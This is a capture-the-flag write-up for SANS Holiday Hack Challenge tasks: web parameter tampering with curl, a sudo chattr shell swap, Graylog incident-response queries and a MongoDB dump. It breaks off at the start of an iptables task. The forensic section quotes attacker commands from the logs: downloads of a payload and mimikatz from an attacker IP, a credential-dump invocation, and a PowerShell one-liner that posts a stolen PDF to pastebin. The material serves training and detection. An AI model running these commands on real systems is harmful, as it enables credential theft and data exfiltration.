# 2. Secondary Objectives
## 2.7. The Holiday Hack Trail
2.7.1. Description
I don’t know what happened here but I think part of the conversation with Minty Candycane is missing, speaking with her:
One is about web application penetration testing. Good luck, and don't get dysentery!

The Holiday Hack Trail Initial page:


Store page:
	
2.7.2. Solution
2.7.2.1. Easy
The parameters are passed via the URL with GET requests, it is possible to alter the distance parameter to 8000 to reach the end. The altered URL will look similar to:
hhc://trail.hhc/trail/?difficulty=0&distance=8000&money=5000&pace=0&curmonth=7&curday=1&reindeer=2&runners=2&ammo=100&meds=20&food=400&name0=John&health0=100&cond0=0&causeofdeath0=&deathday0=0&deathmonth0=0&name1=Sally&health1=100&cond1=0&causeofdeath1=&deathday1=0&deathmonth1=0&name2=Anna&health2=100&cond2=0&causeofdeath2=&deathday2=0&deathmonth2=0&name3=Kendra&health3=100&cond3=0&causeofdeath3=&deathday3=0&deathmonth3=0

At this point the interface will show that the distance remaining is 0 as per picture below:


Pressing the “GO” button again will take to the winning page:

2.7.2.2. Medium
Here the parameters are sent via POST request, but are injectable in the same manner as the Easy difficulty level. Below the output obtained by sending the altered request with curl:
curl 'https://trail.elfu.org/trail/' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: https://trail.elfu.org' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -H 'Sec-Fetch-User: ?1' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-Mode: nested-navigate' -H 'Referer: https://trail.elfu.org/trail/' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7' -H 'Cookie: trail-mix-cookie=7f7127a10e92b3a5e77ad1db87cf9ba532463bd4' --data 'pace=2&playerid=JebediahSpringfield&action=go&difficulty=1&money=3000&distance=8000&curmonth=8&curday=2&name0=Chris&health0=100&cond0=0&cause0=&deathday0=0&deathmonth0=0&name1=Emmanuel&health1=100&cond1=0&cause1=&deathday1=0&deathmonth1=0&name2=Chloe&health2=100&cond2=0&cause2=&deathday2=0&deathmonth2=0&name3=Jen&health3=100&cond3=0&cause3=&deathday3=0&deathmonth3=0&reindeer=2&runners=2&ammo=50&meds=10&food=184&hash=HASH' --compressed

This resource can be found at <a href='https://trail.elfu.org/fin/?reason=victory&amp;name0=Chris&amp;death0=notdeadyet&amp;name1=Emmanuel&amp;death1=notdeadyet&amp;name2=Chloe&amp;death2=notdeadyet&amp;name3=Jen&amp;death3=notdeadyet&amp;curday=3&amp;curmonth=8&amp;money=3000&amp;reindeer=2&amp;alivecount=4&amp;difficulty=1&amp;hash=91ac54832b5d59c195e196a3ae959e6b&amp;victorytoken={ hash:"f3e41a22416c2397460403fa82d40307f4379da95d41d5e366b55a1e775c5d41", resourceId: "JebediahSpringfield"}'>https://trail.elfu.org/fin/?reason=victory&amp;name0=Chris&amp;death0=notdeadyet&amp;name1=Emmanuel&amp;death1=notdeadyet&amp;name2=Chloe&amp;death2=notdeadyet&amp;name3=Jen&amp;death3=notdeadyet&amp;curday=3&amp;curmonth=8&amp;money=3000&amp;reindeer=2&amp;alivecount=4&amp;difficulty=1&amp;hash=91ac54832b5d59c195e196a3ae959e6b&amp;victorytoken={ hash:"f3e41a22416c2397460403fa82d40307f4379da95d41d5e366b55a1e775c5d41", resourceId: "JebediahSpringfield"}</a>.

Visiting the URL mentioned in the response, below web page is shown:

2.7.2.3. Hard
At hard level parameters are sent via POST requests and each contains an undocumented hash value. Considering that in the Easy level a verification hash was calculated from the number of points, I thought that this hash may have been a numeric value representing the current points acquired. The decrypt tool from md5online.org confirmed that this value is numeric but it was much lower than what I expected.

I noticed that the first “GO” request had always the hash of 1626 and I thought that this value was a checksum made up of values in page and I tried to figure out which of these were involved. Checking the difference with a second “GO” request it was possible to identify the below list of parameters involved in the hash creation:
money
distance
curmonth
curday
reindeer
runners
ammo
meds
food

Below the output obtained by submitting a tampered “GO” request with a valid hash via curl:
curl 'https://trail.elfu.org/trail/' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: https://trail.elfu.org' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -H 'Sec-Fetch-User: ?1' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-Mode: nested-navigate' -H 'Referer: https://trail.elfu.org/trail/' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7' -H 'Cookie: trail-mix-cookie=e543662c928fc61549bbfe167729d528f7a270ea' --data 'pace=0&playerid=02554611-d73c-4881-baa7-9549350ec50b&action=go&difficulty=2&money=1500&distance=8000&curmonth=9&curday=1&name0=Sam&health0=100&cond0=0&cause0=&deathday0=0&deathmonth0=0&name1=Sally&health1=100&cond1=0&cause1=&deathday1=0&deathmonth1=0&name2=Joseph&health2=100&cond2=0&cause2=&deathday2=0&deathmonth2=0&name3=Evie&health3=100&cond3=0&cause3=&deathday3=0&deathmonth3=0&reindeer=2&runners=2&ammo=10&meds=2&food=100&hash=649d45bf179296e31731adfd4df25588' --compressed

This resource can be found at <a href='https://trail.elfu.org/fin/?reason=victory&amp;name0=Sam&amp;death0=notdeadyet&amp;name1=Sally&amp;death1=notdeadyet&amp;name2=Joseph&amp;death2=notdeadyet&amp;name3=Evie&amp;death3=notdeadyet&amp;curday=2&amp;curmonth=9&amp;money=1500&amp;reindeer=2&amp;alivecount=4&amp;difficulty=2&amp;hash=57ec46350ce6dbd9881127dd6d102cfb&amp;victorytoken={ hash:"4f112f9623bbac3e927d0c92be2fece33473bce3ed35383ae979c214d39fe43e", resourceId: "02554611-d73c-4881-baa7-9549350ec50b"}'>https://trail.elfu.org/fin/?reason=victory&amp;name0=Sam&amp;death0=notdeadyet&amp;name1=Sally&amp;death1=notdeadyet&amp;name2=Joseph&amp;death2=notdeadyet&amp;name3=Evie&amp;death3=notdeadyet&amp;curday=2&amp;curmonth=9&amp;money=1500&amp;reindeer=2&amp;alivecount=4&amp;difficulty=2&amp;hash=57ec46350ce6dbd9881127dd6d102cfb&amp;victorytoken={ hash:"4f112f9623bbac3e927d0c92be2fece33473bce3ed35383ae979c214d39fe43e", resourceId: "02554611-d73c-4881-baa7-9549350ec50b"}</a>.

Visiting the URL mentioned in the response, below web page is shown:

2.7.3. Afterwords
Speaking again with Minty Candycane:
You made it - congrats! Have you played with the key grinder in my room? Check it out! It turns out: if you have a good image of a key, you can physically copy it. Maybe you'll see someone hopping around with a key here on campus. Sometimes you can find it in the Network tab of the browser console. Deviant has a great talk on it at this year's Con. He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale.
2.8. Nyanshell
2.8.1. Description
Speaking with Alabaster Snowball:
Every time I try to log in, I get accosted with ... a hatted cat and a toaster pastry? I thought my shell was Bash, not flying feline. When I try to overwrite it with something else, I get permission errors. Have you heard any chatter about immutable files? And what is sudo -l telling me?

Nyanshell motd:
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░
░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░
░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░
░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░
░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░
░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░
░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░
░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░
░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░
░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░
░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░
░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

nyancat, nyancat
I love that nyancat!
My shell's stuffed inside one
Whatcha' think about that?

Sadly now, the day's gone
Things to do!  Without one...
I'll miss that nyancat
Run commands, win, and done!

Log in as the user alabaster_snowball with a password of Password2, and land in a Bash prompt.

Target Credentials:

username: alabaster_snowball
password: Password2
elf@e60e948135e9:~$
2.8.2. Solution
elf@e60e948135e9:~$ sudo -l
Matching Defaults entries for elf on e60e948135e9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elf may run the following commands on e60e948135e9:
    (root) NOPASSWD: /usr/bin/chattr
elf@e60e948135e9:~$ su alabaster_snowball

elf@e60e948135e9:~$ cat /etc/passwd | grep alabaster
alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
elf@e60e948135e9:~$ xxd /bin/nsh  | head -n 1
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
elf@e60e948135e9:~$ chattr -i /bin/nsh 
chattr: Permission denied while setting flags on /bin/nsh
elf@e60e948135e9:~$ sudo chattr -i /bin/nsh
elf@e60e948135e9:~$ dd if=/bin/bash of=/bin/nsh
2282+1 records in
2282+1 records out
1168776 bytes (1.2 MB, 1.1 MiB) copied, 0.00964688 s, 121 MB/s
elf@e60e948135e9:~$ su alabaster_snowball
Password: 
Loading, please wait......



You did it! Congratulations!

alabaster_snowball@e60e948135e9:/home/elf$
2.8.3. Afterwords
Speaking again with Alabaster Snowball:
Who would do such a thing?? Well, it IS a good looking cat. Have you heard about the Frido Sleigh contest? There are some serious prizes up for grabs. The content is strictly for elves. Only elves can pass the CAPTEHA challenge required to enter. I heard there was a talk at KCII about using machine learning to defeat challenges like this. I don't think anything could ever beat an elf though!
2.9. Graylog
2.9.1. Description
Speaking with Pepper Minstix:
It's me - Pepper Minstix. Normally I'm jollier, but this Graylog has me a bit mystified. Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala. Some Elf U computers were hacked, and I've been tasked with performing incident response. Can you help me fill out the incident response report using our instance of Graylog? It's probably helpful if you know a few things about Graylog. Event IDs and Sysmon are important too. Have you spent time with those? Don't worry - I'm sure you can figure this all out for me! Click on the All messages Link to access the Graylog search interface! Make sure you are searching in all messages! The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner. Login with the username elfustudent and password elfustudent. 
2.9.2. Question #1
2.9.2.1. Description
Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.

What is the full-path + filename of the first malicious file downloaded by Minty?
2.9.2.2. Solution
Below search was used to get all TargetFilenames related to minty:
	minty AND TargetFilename:/.{1,}/
The search returned 18 elements among which C:\Users\minty\Downloads\cookie_recipe.exe.
2.9.2.3. Flag
The flag is: C:\Users\minty\Downloads\cookie_recipe.exe.
2.9.2.4. Afterwords
We can find this searching for sysmon file creation event id 2 with a process named firefox.exe and not junk .temp files. We can use regular expressions to include or exclude patterns:
TargetFilename:/.+\.pdf/
2.9.3. Question #2
2.9.3.1. Description
The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?
2.9.3.2. Solution
Below search was used to get all network connection related to cookie_recipe.exe:
	cookie_recipe.exe AND EventID:3
The search returned 1 element among with DestinationIp 192.168.247.175 and DestinationPort 4444.
2.9.3.3. Flag
The flag is: 192.168.247.175:4444.
2.9.3.4. Afterwords
We can pivot off the answer to our first question using the binary path as our ProcessImage.
2.9.4. Question #3
2.9.4.1. Description
What was the first command executed by the attacker?

(answer is a single word)
2.9.4.2. Solution
Knowing the PID of cookie_recipe.exe and assuming that every command execution spawns a new process, it was possible to filter on new process creations with parent 5256:
	EventID:1 AND ParentProcessId:5256
After sorting by timestamp, the first result is the execution of C:\Windows\system32\cmd.exe /c "whoami ".
2.9.4.3. Flag
The flag is: whoami.
2.9.4.4. Afterwords
Since all commands (sysmon event id 1) by the attacker are initially running through the cookie_recipe.exe binary, we can set its full-path as our ParentProcessImage to find child processes it creates sorting on timestamp.
2.9.5. Question #4
2.9.5.1. Description
What is the one-word service name the attacker used to escalate privileges?
2.9.5.2. Solution
With results from previous query it was possible to see the attacker downloaded a second stage with C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/cookie_recipe2.exe -OutFile cookie_recipe2.exe " and then execute it with C:\Windows\system32\cmd.exe /c "sc start webexservice a software-update 1 wmic process call create "cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe" ".
2.9.5.3. Flag
The flag is: webexservice.
2.9.5.4. Afterwords
Continuing on using the cookie_reciper.exe binary as our ParentProcessImage, we should see some more commands later on related to a service.
2.9.6. Question #5
2.9.6.1. Description
What is the file-path + filename of the binary ran by the attacker to dump credentials?
2.9.6.2. Solution
Below search pivots on the cookie_recipe2.exe file:
ParentProcessImage:"C:\\Users\\minty\\Downloads\\cookie_recipe2.exe"
One of the logs highlights the download of mimikatz with command C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe ".
Below search focuses on C:\cookie.exe related executions:
ProcessImage:"C:\\cookie.exe"
It is possible to notice its execution as "C:\cookie.exe" privilege::debug sekurlsa::logonpasswords exit thus recognizing common mimkatz parameters.
2.9.6.3. Flag
The flag is: C:\cookie.exe.
2.9.6.4. Afterwords
The attacker elevates privileges using the vulnerable webexservice to run a file called cookie_recipe2.exe. Let's use this binary path in our ParentProcessImage search.
2.9.7. Question #6
2.9.7.1. Description
The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine?
2.9.7.2. Solution
Using below search it is possible to verify to which IPs the compromised machine connected to:
EventID:3 AND SourceHostname:DEFANELF
With this search it is possible to see that it connected to ports 135 (RPC), 445 (SMB), 3389 (RDP) and 49672. As RDP and SMB are protocols commonly used during lateral movements but RDP leaves traces in the WinEvent logs, I started pivoting from it with search:
EventID:4624 AND SourceHostName:DEFANELF
The search returned 14 messages, all mentioning alabaster as AccountName.
2.9.7.3. Flag
The flag is: alabaster.
2.9.7.4. Afterwords
Windows Event Id 4624 is generated when a user network logon occurs successfully. We can also filter on the attacker's IP using SourceNetworkAddress. 
2.9.8. Question #7
2.9.8.1. Description
What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?
2.9.8.2. Solution
Adding filter for successful network logons to the previous query provides the search:
EventID:4624 AND LogonType:10
Returns 1 event that identifies the login to the machine with user NORTHPOLE\alabaster at 2019-11-19 06:04:28.000 +00:00.
2.9.8.3. Flag
The flag is: 06:04:28.
2.9.8.4. Afterwords
LogonType 10 is used for successful network connections using the RDP client.
2.9.9. Question #8
2.9.9.1. Description
The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection?

(submit in that order as csv)
2.9.9.2. Solution
Knowing that LogonType 10 were already identified, I tried focusing on other potentialy interesting logon types from DEFANELF, the originally compromised machine, and elfu-res-wks2, the second one. After just too much time spent understanding that I should search for the SourceHostName in all capitals, i ended up using search:
EventID:4624 AND NOT LogonType:10 AND (SourceHostName:(DEFANELF OR ELFU-RES-WKS2) AND NOT DestinationHostname:(DEFANELF OR elfu-res-wks2))
This returns 8 events that identifies logins via SMB to elfu-res-wks3 and elfu-res-wks1.
2.9.9.3. Flag
The flag is: elfu-res-wks2,elfu-res-wks3,3.
2.9.9.4. Afterwords
The attacker has GUI access to workstation 2 via RDP. They likely use this GUI connection to access the file system of of workstation 3 using explorer.exe via UNC file paths (which is why we don't see any cmd.exe or powershell.exe process creates). However, we still see the successful network authentication for this with event id 4624 and logon type 3.
2.9.10. Question #9
2.9.10.1. Description
What is the full-path + filename of the secret research document after being transferred from the third host to the second host?
2.9.10.2. Solution
Knowing that there was a connection between host 3, elfu-res-wks3, and host 2, elfu-res-wks2, searching for connection between them would narrow time frames:
EventID:3 AND ((SourceHostname:elfu-res-wks3 AND DestinationHostname:elfu-res-wks2) OR (SourceHostname:elfu-res-wks2 AND DestinationHostname:elfu-res-wks3))
Using this search allows to get 3 results at 2019-11-19 05:58:28.000, 2019-11-19 05:58:29.000 and 2019-11-19 05:58:29.000.

Starting to arrange timeframes searching for file creations on host 2 while excluding uninteresting folders led to 1 event between 2019-11-19 05:58:28 and 2019-11-19 06:10:00 with search:
EventID:2 AND source:elfu-res-wks2 AND NOT TargetFilename:(/.*ProgramData.*/ OR /.*SoftwareDistribution.*/ OR /.*AppData.*/)
This event shows the creation of a file named C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf from C:\Windows\Explorer.EXE thus also confirming the exfiltration via SMB.
2.9.10.3. Flag
The flag is: C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf.
2.9.10.4. Afterwords
We can look for sysmon file creation event id of 2 with a source of workstation 2. We can also use regex to filter out overly common file paths using something like:
AND NOT TargetFilename:/.+AppData.+/
2.9.11. Question #10
2.9.11.1. Description
What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?
2.9.11.2. Solution
It is possible to search for the filename that was saved on host 2 to see if it was involved in other events with query:
	"C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf"
Even with such a generic query only two results comes up of which one is the process creation for powershell with command line C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri https://pastebin.com/post.php -Method POST -Body @{ "submit_hidden" = "submit_hidden"; "paste_code" = $([Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf"))); "paste_format" = "1"; "paste_expire_date" = "N"; "paste_private" = "0"; "paste_name"="cookie recipe" } thus highlighting that the file was exfiltrated to pastebin.com from PID 1232.

It is possible to verify network events related to this PID with query:
	EventID:3 AND ProcessId:1232
Only one event shows up in the logs, confirming the destination hostname and providing the destination IP 104.22.3.84.
2.9.11.3. Flag
The flag is: 104.22.3.84.
2.9.11.4. Afterwords
We can look for the original document in CommandLine using regex.
When we do that, we see a long a long PowerShell command using Invoke-Webrequest to a remote URL of https://pastebin.com/post.php.
We can pivot off of this information to look for a sysmon network connection id of 3 with a source of elfu-res-wks2 and DestinationHostname of pastebin.com.
2.9.12. Afterwords
In the graylog web ui:
Incident Response Report #7830984301576234 Submitted.
Incident Fully Detected!

Speaking again with Pepper Minstix:
That's it - hooray! Have you had any luck retrieving scraps of paper from the Elf U server? You might want to look into SQL injection techniques. OWASP is always a good resource for web attacks. For blind SQLi, I've heard Sqlmap is a great tool. In certain circumstances though, you need custom tamper scripts to get things going!
2.10. Mongo Pilfer
2.10.1. Description
Speaking with Holly Evergreen:
Hey! It's me, Holly Evergreen! My teacher has been locked out of the quiz database and can't remember the right solution. Without access to the answer, none of our quizzes will get graded. Can we help get back in to find that solution? I tried lsof -i, but that tool doesn't seem to be installed. I think there's a tool like ps that'll help too. What are the flags I need? Either way, you'll need to know a teensy bit of Mongo once you're in. Pretty please find us the solution to the quiz!

Mongo Pilfer motd:
'...',...'::'''''''''cdc,',,,,,,,cxo;,,,,,,,,:dl;,;;:;;;;;l:;;;cx:;;:::::lKXkc::
oc;''.',coddol;''';ldxxxxoc,,,:oxkkOkdc;,;:oxOOOkdc;;;:lxO0Oxl;;;;:lxOko::::::cd
ddddocodddddddxxoxxxxxkkkkkkxkkkkOOOOOOOxkOOOOOOO00Oxk000000000xdk00000K0kllxOKK
coddddxxxo::ldxxxxxxdl:cokkkkkOkxl:lxOOOOOOOkdlok0000000Oxok00000000OkO0KKKKKKKK
'',:ldl:,'''',;ldoc;,,,,,,:oxdc;,,,;;;cdOxo:;;;;;:ok0kdc;;;;:ok00kdc:::lx0KK0xoc
oc,''''';cddl:,,,,,;cdkxl:,,,,,;lxOxo:;;;;;:ldOxl:;;:;;:ldkoc;;::;;:oxo:::ll::co
xxxdl:ldxxxxkkxocldkkkkkkkkocoxOOOOOOOkdcoxO000000kocok000000kdccdk00000ko:cdk00
oxxxxxxxxkddxkkkkkkkkkdxkkkkOOOOOOxOOOOO00OO0Ok0000000000OO0000000000O0000000000
',:oxkxoc;,,,:oxkkxo:,,,;ldkOOkdc;;;cok000Odl:;:lxO000kdc::cdO0000xoc:lxO0000koc
l;'',;,,,;lo:,,,;;,,;col:;;;c:;;;col:;;:lc;;:loc:;:co::;:oo:;;col:;:lo:::ldl:::l
kkxo:,:lxkOOOkdc;;ldOOOOOkdc;:lxO0000ko:;:oxO000Oxl::cdk0000koc::ox0KK0ko::cok0K
kkkkOkOOOOOkOOOOOOOOOOOOOOOOOO0000000000O0000000000000000000000O000KKKKKK0OKKKKK
,:lxOOOOxl:,:okOOOOkdl;:lxO0000Oxl:cdk00000Odlcok000000koclxO00000OdllxOKKKK0kol
l;,,;lc;,,;c;,,;lo:;;;cc;;;cdoc;;;l:;;:oxoc::cc:::lxxl:::l:::cdxo:::lc::ldxoc:cl
KKOd:,;cdOXXXOdc;;:okKXXKko:;;cdOXNNKxl:::lkKNNXOo:::cdONNN0xc:::oOXNN0xc::cx0NW
XXXXX0KXXXXXXXXXK0XXXXXXNNNX0KNNNNNNNNNX0XNNNNNNNNN0KNNNNNNNNNK0NNNNNNNWNKKWWWWW
:lxKXXXXXOdcokKXXXXNKkolxKNNNNNN0xldOXNNNNNXOookXNNNNWN0xokKNNNNNNKxoxKWWNWWXOod
:;,,cdxl;,;:;;;cxOdc;;::;;:dOOo:;:c:::lk0xl::cc::lx0ko:::c::cd0Odc::c::cx0ko::lc
OOxl:,,;cdk0Oxo:;;;:ok00Odl:;;:lxO00koc:::ldO00kdl:::cok0KOxl:::cok0KOxl:::lx0KK
00000kxO00000000OxO000000000kk000000000Ok0KK00KKKK0kOKKKKKKKK0kOKKKKKKKK0k0KKKKK
:cok00000OxllxO000000koldO000000Odlok0KKKKKOxoox0KKKKK0koox0KKKKK0xoox0KKKKKkdld
;:,,:oxoc;;;;;;cokdl:;;:;;coxxoc::c:::lxkdc::c:::ldkdl::cc::ldkdl::lc::lxxoc:loc
OOkdc;;;:oxOOkoc;;;:lxO0Odl:;::lxO00koc:::lxO00kdl:::lxO00Odl::cox0KKOdl:cox0KK0
OOOOOOxk00000000Oxk000000000kk000000000Ok0KK0000KK0k0KKKKKKKK0OKKKKKKKKK00KKK0KK
c:ldOOOO0Oxoldk000000koldk000000kdlox0000K0OdloxOKK0K0kdlox0KKKK0xocok0KKK0xocld
;l:;;cooc;;;c:;:lddl:;:c:::ldxl:::lc::cdxo::coc::cddl::col::cddl:codlccldlccoxdc
000Odl;;:ok000koc;;cok0K0kdl::cdk0KKOxo::ldOKKK0xoccox0KKK0kocldOKKKK0xooxOKKKKK
0000000O0000000000O0KKK0KKKK00KKKK0KKKKK0KKKK0KKKKKKKKKK0KKKKKKKKKO0KKKKKKKKOkKK
c::ldO000Oxl:cok0KKKOxl:cdk0KKKOdl:cok0KK0kdl:cok0KK0xoccldk0K0kocccldOK0kocccco
;;;;;;cxl;;;;::::okc::::::::dxc::::::::odc::::::::ol:ccllcccclcccodocccccccdkklc

Hello dear player!  Won't you please come help me get my wish!
I'm searching teacher's database, but all I find are fish!
Do all his boating trips effect some database dilution?
It should not be this hard for me to find the quiz solution!

Find the solution hidden in the MongoDB on this system.

elf@087f0488044c:~$
2.10.2. Solution
elf@acd4556261a1:~$ netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:12121         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:35720         127.0.0.1:12121         TIME_WAIT  
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     21798101 /tmp/mongodb-12121.sock
elf@acd4556261a1:~$ mongodump --port 12121
2020-01-06T01:28:32.774+0000    writing admin.system.version to 
2020-01-06T01:28:32.774+0000    done dumping admin.system.version (1 document)
2020-01-06T01:28:32.774+0000    writing elfu.metadata to 
2020-01-06T01:28:32.774+0000    writing elfu.line to 
2020-01-06T01:28:32.774+0000    writing elfu.tincan to 
2020-01-06T01:28:32.775+0000    writing elfu.solution to 
2020-01-06T01:28:32.775+0000    done dumping elfu.metadata (15 documents)
2020-01-06T01:28:32.775+0000    writing elfu.bait to 
2020-01-06T01:28:32.775+0000    done dumping elfu.line (1 document)
2020-01-06T01:28:32.775+0000    writing elfu.tackle to 
2020-01-06T01:28:32.775+0000    done dumping elfu.tincan (1 document)
2020-01-06T01:28:32.775+0000    done dumping elfu.tackle (1 document)
2020-01-06T01:28:32.775+0000    done dumping elfu.bait (1 document)
2020-01-06T01:28:32.776+0000    writing test.redherring to 
2020-01-06T01:28:32.776+0000    writing elfu.chum to 
2020-01-06T01:28:32.776+0000    done dumping elfu.solution (1 document)
2020-01-06T01:28:32.776+0000    done dumping test.redherring (1 document)
2020-01-06T01:28:32.776+0000    done dumping elfu.chum (1 document)
elf@acd4556261a1:~$ find dump/* -type f -exec echo "" \; -exec echo {} \; -exec cat {} \; -exec echo "" \;
dump/admin/system.version.metadata.json
{"options":{},"indexes":[{"v":2,"key":{"_id":1},"name":"_id_","ns":"admin.system.version"}],"uuid":"9e4fd1d4955946c983b8a5269e6c25f7"}
[...omissis…]
dump/elfu/solution.bson
t_id fYou did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **
[...omissis…]
elf@acd4556261a1:~$ mongo --port 12121
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:12121/
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
Server has startup warnings: 
2020-01-06T01:24:52.502+0000 I CONTROL  [initandlisten] 
2020-01-06T01:24:52.502+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2020-01-06T01:24:52.502+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2020-01-06T01:24:52.502+0000 I CONTROL  [initandlisten] 
2020-01-06T01:24:52.502+0000 I CONTROL  [initandlisten] 
2020-01-06T01:24:52.502+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is 'always'.
2020-01-06T01:24:52.502+0000 I CONTROL  [initandlisten] **        We suggest setting it to 'never'
2020-01-06T01:24:52.502+0000 I CONTROL  [initandlisten] 
> use elfu
switched to db elfu
> db.loadServerScripts();displaySolution();
[...omissis…]
 Congratulations!!
[...omissis…]
         .
       __/ __
            /
       /.'*'. 
        .o.'.
       .'.'*'.
      *'.o.'.*.
     .'.*.'.'.*.
    .*.'.o.'.*.'.
       [_____]
        ___/


  Congratulations!!
[...omissis…]
2.10.3. Afterwords
Speaking again with Holly Evergreen:
Woohoo! Fantabulous! I'll be the coolest elf in class. On a completely unrelated note, digital rights management can bring a hacking elf down. That ElfScrow one can really be a hassle. It's a good thing Ron Bowes is giving a talk on reverse engineering! That guy knows how to rip a thing apart. It's like he breathes opcodes!
2.11. Smart Braces
2.11.1. Description
Speaking with Kent Tinseltooth:
OK, this is starting to freak me out! Oh sorry, I'm Kent Tinseltooth. My Smart Braces are acting up. Do... Do you ever get the feeling you can hear things? Like, voices? I know, I sound crazy, but ever since I got these... Oh! Do you think you could take a look at my Smart Braces terminal? I'll bet you can keep other students out of my head, so to speak. It might just take a bit of Iptables work.

Smart Braces motd:
Inner Voice: Kent. Kent. Wake up, Kent.
Inner Voice: I'm talking to you, Kent.
Kent TinselTooth: Who said that? I must be going insane.
Kent TinselTooth: Am I?
Inner Voice: That remains to be seen, Kent. But we are having a conversation.
Inner Voice: This is Santa, Kent, and you've been a very naughty boy.
Kent TinselTooth: Alright! Who is this?! Holly? Minty? Alabaster?
Inner Voice: I am known by many names. I am the boss of the North Pole. Turn to me and be hired after graduation.
Kent TinselTooth: Oh, sure.
Inner Voice: Cut the candy, Kent, you've built an automated, machine-learning, sleigh device.
Kent TinselTooth: How did you know that?
Inner Voice: I'm Santa - I know everything.
Kent TinselTooth: Oh. Kringle. *sigh*
Inner Voice: That's right, Kent. Where is the sleigh device now?
Kent TinselTooth: I can't tell you.
Inner Voice: How would you like to intern for the rest of time?
Kent TinselTooth: Please no, they're testing it at srf.elfu.org using default creds, but I don't know more. It's classified.
Inner Voice: Very good Kent, that's all I needed to know.
Kent TinselTooth: I thought you knew everything?
Inner Voice: Nevermind that. I want you to think about what you've researched and studied. From now on, stop playing with your teeth, and floss more.
*Inner Voice Goes Silent*

Kent TinselTooth: Oh no, I sure hope that voice was Santa's.
Kent TinselTooth: I suspect someone may have hacked into my IOT teeth braces.
Kent TinselTooth: I must have forgotten to configure the firewall...
Kent TinselTooth: Please review /home/elfuuser/IOTteethBraces.md and help me configure the firewall.
Kent TinselTooth: Please hurry; having this ribbon cable on my teeth is uncomfortable.
elfuuser@a7388e6e83d0:~$
2.11.2. Solution
elfuuser@a7388e6e83d0:~$ cat IOTteethBraces.md 
